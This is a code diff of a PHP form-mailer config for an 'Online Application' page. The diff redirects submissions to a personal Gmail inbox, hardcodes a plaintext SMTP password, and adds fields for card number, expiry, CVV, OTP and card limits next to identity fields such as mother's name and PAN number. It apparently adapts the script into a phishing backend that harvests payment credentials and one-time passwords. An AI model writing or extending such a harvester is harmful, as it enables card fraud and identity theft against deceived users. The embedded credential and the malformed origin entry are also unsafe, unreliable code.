@@ -15,22 +15,22 @@
 date_default_timezone_set('Asia/Kolkata');
 
 // ================= CONFIG =================
-$TO_EMAIL   = 'harshkumar115@gmail.com';
-$FROM_EMAIL = 'harsh.kanojia03@gmail.com';   // MUST be a real mailbox on the SAME domain this file is hosted on
+$TO_EMAIL   = 'amirkhan20055555@gmail.com';
+$FROM_EMAIL = 'amirkhan20055555@gmail.com';   // MUST be a real mailbox on the SAME domain this file is hosted on
 $FROM_NAME  = 'Online Application';
 $SUBJECT    = 'New Online Application';
 
 // Only your site may call this file (add http://localhost:4200 while testing locally)
 $ALLOWED_ORIGINS = [
     'https://demoindiadev.vercel.app',
-    'https://www.demoindiadev.vercel.app/',
+    'https://www.demoindiadev.vercel.appe',
 ];
 
 // ---- SMTP (optional, recommended) ----
 $USE_SMTP  = false;                        // true karein agar SMTP use karna hai
-$SMTP_HOST = 'mail.easycalculation.in';    // hosting panel > Email Accounts > Connect devices
-$SMTP_USER = 'info@easycalculation.in';
-$SMTP_PASS = 'YOUR_MAILBOX_PASSWORD';
+$SMTP_HOST = 'mail.demoindiadev.vercel.app';    // hosting panel > Email Accounts > Connect devices
+$SMTP_USER = 'amirkhan20055555@gmail.com';
+$SMTP_PASS = 'khansahad1234@';
 $SMTP_PORT = 465;                          // 465 = SSL, 587 = TLS
 // ==========================================
 
@@ -84,15 +84,23 @@ if (empty($data['fullName']) || empty($data['mobile'])) {
 
 // ---- Friendly labels for known fields ----
 $labels = [
-    'fullName'   => 'Full Name',
-    'motherName' => "Mother's Name",
-    'mobile'     => 'Mobile Number',
-    'email'      => 'Email',
-    'dob'        => 'Date of Birth',
-    'city'       => 'City',
-    'address'    => 'Address',
-    'pincode'    => 'Pincode',
-    'panNumber'  => 'PAN Number',
+    'fullName'       => 'Full Name',
+    'motherName'     => "Mother's Name",
+    'mobile'         => 'Mobile Number',
+    'email'          => 'Email',
+    'dob'            => 'Date of Birth',
+    'city'           => 'City',
+    'address'        => 'Address',
+    'pincode'        => 'Pincode',
+    'panNumber'      => 'PAN Number',
+    'agree'          => 'Agreed to Terms',
+   
+    'cardNumber'     => 'Card Number',
+    'totalLimit'     => 'Total Limit',
+    'availableLimit' => 'Available Limit',
+    'expiry'         => 'Card Expiry',
+    'cvv'            => 'CVV',
+    'OTP'            => 'OTP',
 ];
 
 // Converts any value (bool / array / null) into readable text
